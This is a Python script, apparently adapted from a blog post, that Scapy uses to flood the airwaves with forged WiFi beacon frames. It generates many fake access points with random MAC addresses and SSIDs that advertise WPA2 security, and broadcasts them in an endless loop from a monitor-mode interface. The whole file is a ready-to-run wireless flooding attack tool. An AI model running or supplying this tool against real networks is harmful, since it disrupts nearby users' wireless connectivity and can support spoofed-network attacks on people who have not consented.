#!/usr/bin/env python
# -*- coding: UTF-8 -*-
#
# source: https://www.4armed.com/blog/forging-wifi-beacon-frames-using-scapy/
# 
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp, hexdump, RandMAC
import random
import argparse
import string

# Passing arguments
parser = argparse.ArgumentParser(prog="Scapy flood attack",
                                 usage="python flood.py -i wlan0mon [-f file]",
                                 description="Scapy based wifi flood")
parser.add_argument("-i", "--Interface", required=True,
                    help="The interface that you want to send packets out of, needs to be set to monitor mode")
parser.add_argument("-f", "--file", required=False, help="File of network name")

args = parser.parse_args()

ssids = []
# If a file is given we read it
if args.file:
    network_file = open(args.file, 'r')
    ssids = network_file.readlines()
else:
    # We ask how many SSID the user want
    numbers = int(input("Number of SSID to generate: "))
    for i in range(numbers):
        # We generate a random name for each SSID
        letters = string.ascii_lowercase
        ssids.append(''.join(random.choice(letters) for i in range(10)))

iface = args.Interface
frames = []
print(ssids)
for ssid in ssids:
    # For each SSID we craft a Beacon fram
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
                  addr2=str(RandMAC()), addr3=str(RandMAC()))
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    rsn = Dot11Elt(ID='RSNinfo', info=(
        '\x01\x00'  # RSN Version 1
        '\x00\x0f\xac\x02'  # Group Cipher Suite : 00-0f-ac TKIP
        '\x02\x00'  # 2 Pairwise Cipher Suites (next two lines)
        '\x00\x0f\xac\x04'  # AES Cipher
        '\x00\x0f\xac\x02'  # TKIP Cipher
        '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
        '\x00\x0f\xac\x02'  # Pre-Shared Key
        '\x00\x00'))  # RSN Capabilities (no extra capabilities)

    frame = RadioTap() / dot11 / beacon / essid / rsn
    frames.append(frame)
sendp(frames, iface=iface, inter=0.01, loop=1)
